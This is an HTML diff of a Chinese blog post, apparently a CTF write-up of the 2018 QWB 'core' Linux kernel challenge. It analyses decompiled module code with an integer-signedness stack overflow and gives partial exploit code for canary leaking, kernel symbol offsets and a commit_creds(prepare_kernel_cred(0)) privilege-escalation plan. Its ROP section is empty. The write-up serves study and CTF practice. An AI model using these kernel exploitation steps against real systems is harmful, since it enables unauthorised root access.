@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Linux kernel pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="第二道kernel pwn，去年强网杯的core，参考着CTF-WIKI上调试的，发现有很多东西都是第一次接触到，记录一下。">
+<meta name="keywords" content="Linux kernel pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018强网杯 core">
+<meta property="og:url" content="http://x3h1n.github.io/2019/07/04/2018强网杯-core/index.html">
+<meta property="og:site_name" content="X3h1n">
+<meta property="og:description" content="第二道kernel pwn，去年强网杯的core，参考着CTF-WIKI上调试的，发现有很多东西都是第一次接触到，记录一下。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://x3h1n.github.io/2019/07/04/2018强网杯-core/1.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/07/04/2018强网杯-core/2.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/07/04/2018强网杯-core/3.png">
+<meta property="og:updated_time" content="2019-07-09T03:58:37.908Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018强网杯 core">
+<meta name="twitter:description" content="第二道kernel pwn，去年强网杯的core，参考着CTF-WIKI上调试的，发现有很多东西都是第一次接触到，记录一下。">
+<meta name="twitter:image" content="http://x3h1n.github.io/2019/07/04/2018强网杯-core/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://x3h1n.github.io/2019/07/04/2018强网杯-core/"/>
+
+
+
+
+
+  <title>2018强网杯 core | X3h1n</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">X3h1n</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2019/07/04/2018强网杯-core/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="X3h1n">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2018强网杯 core</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-04T15:47:28+08:00">
+                2019-07-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>第二道kernel pwn，去年强网杯的core，参考着CTF-WIKI上调试的，发现有很多东西都是第一次接触到，记录一下。<br><a id="more"></a></p>
+<h1 id="题目简述-amp-题目漏洞"><a href="#题目简述-amp-题目漏洞" class="headerlink" title="题目简述 &amp; 题目漏洞"></a>题目简述 &amp; 题目漏洞</h1><p>init文件的最后设置了关机，可以将这条语句删掉之后重新打包，解压后的core.cpio文件中有一个gen_cpio.sh，是一个方便打包文件系统的脚本。<br>修改init文件重新打包文件系统后运行start.sh，但无法运行：<br><img src="/2019/07/04/2018强网杯-core/1.png" alt="1"><br>修改start.sh将内存由64M修改为128M，再运行kernel，就可以运行了：<br><img src="/2019/07/04/2018强网杯-core/2.png" alt="2"><br>题目开的保护，有Canary。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop$ checksec core.ko</span><br><span class="line">[*] Checking for new versions of pwntools</span><br><span class="line">    To disable this functionality, set the contents of /home/ubuntu/.pwntools-cache/update to &apos;never&apos;.</span><br><span class="line">[*] You have the latest version of Pwntools (3.12.2)</span><br><span class="line">[*] &apos;/home/ubuntu/Desktop/core.ko&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure></p>
+<p>在init文件中将/proc/sys/kernel/kptr_restrict设置为1，将无法通过/proc/kallsyms查看函数的地址：<br><img src="/2019/07/04/2018强网杯-core/3.png" alt="3"><br>在init文件中将/proc/sys/kernel/dmesg_restrict设置为1，非特权用户将无法查看dmesg信息，无法访问内核打印的消息。</p>
+<p>init_nodule中程序创建了虚拟文件/proc/core，应用层通过该文件实现与内核的交互。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">"core"</span>, <span class="number">438L</span>L, <span class="number">0L</span>L, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE, <span class="number">438L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在core_ioctl中定义了三条命令，分别是core_read()、设置全局变量off以及core_copy_func()。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = v3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(v3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在core_read中，程序将从v5[off]为起始地址的64个字节从内核空间拷贝到用户空间。off可以在第二个命令中控制它的数值。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">core_read</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16L</span>L; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 = (__int64 *)((<span class="keyword">char</span> *)v2 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;v5, <span class="string">"Welcome to the QWB CTF challenge.\n"</span>);</span><br><span class="line">  result = copy_to_user(v1, (<span class="keyword">char</span> *)&amp;v5 + off, <span class="number">64L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>第三个命令调用core_copy_func函数，该函数将全局变量name中的内容拷贝到变量v2中，限制拷贝的长度最多为63，但是在长度比较时a1的类型是signed __int64，但是在调用qmemecpy时a1的类型变为unsigned __int16。当a1为负数时，在拷贝时被转换为一个较大的整数，可以造成栈溢出。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">core_copy_func</span><span class="params">(<span class="keyword">signed</span> __int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">    qmemcpy(&amp;v2, &amp;name, (<span class="keyword">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>core_write函数可以对全局变量name进行写操作，从用户空间拷贝到内核空间。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, v3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3;</span><br><span class="line">  printk(&amp;unk_230);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967282L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>exit_core中删除虚拟文件/proc/core。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">exit_core</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( core_proc )</span><br><span class="line">    result = remove_proc_entry(<span class="string">"core"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>题目有栈溢出的漏洞，有canary保护，需要先泄露canary，然后利用栈溢出漏洞构造ROP。利用思路如下：</p>
+<ol>
+<li>利用core_ioctl中的第二条命令设置off的值，再通过函数core_read将v5[off]从内核空间拷贝到用户控件泄露canary。</li>
+<li>利用core_write函数在全局变量name中构造rop，再调用core_copy_func函数将rop拷贝到内核空间。</li>
+<li>利用泄露出的canary和构造的rop执行commit_creds(prepare_kernel_cred(0))进行提权。</li>
+</ol>
+<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>在gdb中调试需要在</p>
+<h2 id="exp组成"><a href="#exp组成" class="headerlink" title="exp组成"></a>exp组成</h2><h3 id="swapgs指令和iretq指令"><a href="#swapgs指令和iretq指令" class="headerlink" title="swapgs指令和iretq指令"></a>swapgs指令和iretq指令</h3><p>首先说一下swapgs指令和iretq指令。<br>swapgs指令通过系统调用切入到kernel系统服务后，通过交换IA32_KERNEL_GS_BASE与IA32_GS_BASE的值，从而得到kernel数据结构的指针，其中，IA32_KERNEL_GS_BASE寄存器是一个MSR寄存器，用了保存kernel级别的数据结构指针。MSR(Model Specific Register)寄存器是为了设置CPU的工作环境和标识CPU的工作状态，包括温度控制、性能监控等，具体可以看<a href="https://blog.csdn.net/edonlii/article/details/8685713" target="_blank" rel="noopener">这篇博客</a>。关于swapgs指令的内容引用了<a href="https://blog.csdn.net/u012927281/article/details/51540447" target="_blank" rel="noopener">这篇博客</a>，好像《程序员的自我修养》里面也有。</p>
+<p>在执行IRET指令时，如果返回到相同级别的任务，将从栈中弹出指令指针、代码段选择器和EFLAGS映像至EIP、CS和EFLAGS寄存器，然后继续执行被中断的程序或过程。如果返回到另一个权限级别则在恢复程序执行之前，还有从栈中弹出堆栈指针和SS。IA-32指令手册中的原文如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the IRET instruction pops the return instruction pointer, return code segment selector, and EFLAGS image from the stack to the EIP, CS, and EFLAGS registers, respectively, and then resumes execution of the interrupted program or procedure. If the return is to another privilege level, the IRET instruction also pops the stack pointer and SS from the stack, before resuming program execution.</span><br></pre></td></tr></table></figure></p>
+<p>那如果从kernel space返回到user space，我们需要在栈中提前准备好rip、CS、EFLAGS、SS和rsp。rip我们可以设置成system(“/bin/sh”)函数地址。<br>因此需要先保存这些寄存器的状态：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">   __asm__(<span class="string">"mov user_cs,cs;"</span></span><br><span class="line">           <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">           <span class="string">"mov user_sp,rsp;"</span></span><br><span class="line">           <span class="string">"pushf;"</span>            <span class="comment">//push eflags</span></span><br><span class="line">           <span class="string">"pop user_rflags;"</span></span><br><span class="line">          );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="获取函数地址"><a href="#获取函数地址" class="headerlink" title="获取函数地址"></a>获取函数地址</h3><p>可以在/tmp/kallsyms中获取到commit_creds和prepare_kernel_cred的函数地址，这里类似于泄露libc，泄露一个地址然后减去它在libc中的偏移就可以得到libc_base，那我们获取到这两个函数地址后，减去它们在vmlinux的偏移，就可以获得vmlinux_base。偏移可以利用pwntools获得：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">vmlinux = ELF(<span class="string">"./vmlinux"</span>)</span><br><span class="line"></span><br><span class="line">base = <span class="number">0xffffffff81000000</span></span><br><span class="line">commit_creds_offset = vmlinux.symbols[<span class="string">"commit_creds"</span>] - base</span><br><span class="line"><span class="keyword">print</span> hex(commit_creds_offset) <span class="comment">#0x9c8e0</span></span><br><span class="line"></span><br><span class="line">prepare_kernel_cred = vmlinux.symbols[<span class="string">"prepare_kernel_cred"</span>] - base</span><br><span class="line"><span class="keyword">print</span> hex(prepare_kernel_cred) <span class="comment">#0x9cce0</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ubuntu@ubuntu:~/Desktop$ checksec vmlinux</span></span><br><span class="line"><span class="string">[*] '/home/ubuntu/Desktop/vmlinux'</span></span><br><span class="line"><span class="string">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="string">    RELRO:    No RELRO</span></span><br><span class="line"><span class="string">    Stack:    Canary found</span></span><br><span class="line"><span class="string">    NX:       NX disabled</span></span><br><span class="line"><span class="string">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="string">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p>
+<p>因此读取/tmp/kallsyms获得函数地址，然后减去对应的偏移获得vmlinux_base。在exp中对应的函数是find_symbols()。</p>
+<h3 id="泄露canary"><a href="#泄露canary" class="headerlink" title="泄露canary"></a>泄露canary</h3><p>在前文的分析中提到第二个命令可以设置off的值，因为v5是rbp-0x50，可以将off设置为0x40，然后泄露canary。buf是char类型，将其转换为size_t后，char buf[0x40]变成了size_t buf[8]。然后buf[0]就是canary。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> idx)</span></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*]set off to %lld\n"</span>,idx);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889C</span>,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//read from kernel</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*]read to buf\n"</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889B</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">core_read(fd, buf);</span><br><span class="line"><span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span>*)buf)[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]canary: %p\n"</span>,canary);</span><br></pre></td></tr></table></figure></p>
+<h3 id="构造rop"><a href="#构造rop" class="headerlink" title="构造rop"></a>构造rop</h3><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_rop-zh/</a></p>
+<p><a href="https://xz.aliyun.com/t/2054" target="_blank" rel="noopener">https://xz.aliyun.com/t/2054</a></p>
+<p><a href="https://blog.csdn.net/u012927281/article/details/51540447" target="_blank" rel="noopener">https://blog.csdn.net/u012927281/article/details/51540447</a></p>
+<p><a href="https://blog.csdn.net/edonlii/article/details/8685713" target="_blank" rel="noopener">https://blog.csdn.net/edonlii/article/details/8685713</a></p>
+<p><a href="http://pwn4.fun/2017/04/20/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%89%EF%BC%89Kernel-Stack-Buffer-Overflow/" target="_blank" rel="noopener">http://pwn4.fun/2017/04/20/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%89%EF%BC%89Kernel-Stack-Buffer-Overflow/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Linux-kernel-pwn/" rel="tag"># Linux kernel pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/03/TCTF-Final-2019-babyheap/" rel="next" title="TCTF_Final 2019 babyheap">
+                <i class="fa fa-chevron-left"></i> TCTF_Final 2019 babyheap
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/06/CVE-2010-2883-Adobe-Reader栈溢出漏洞/" rel="prev" title="CVE-2010-2883 Adobe Reader栈溢出漏洞">
+                CVE-2010-2883 Adobe Reader栈溢出漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
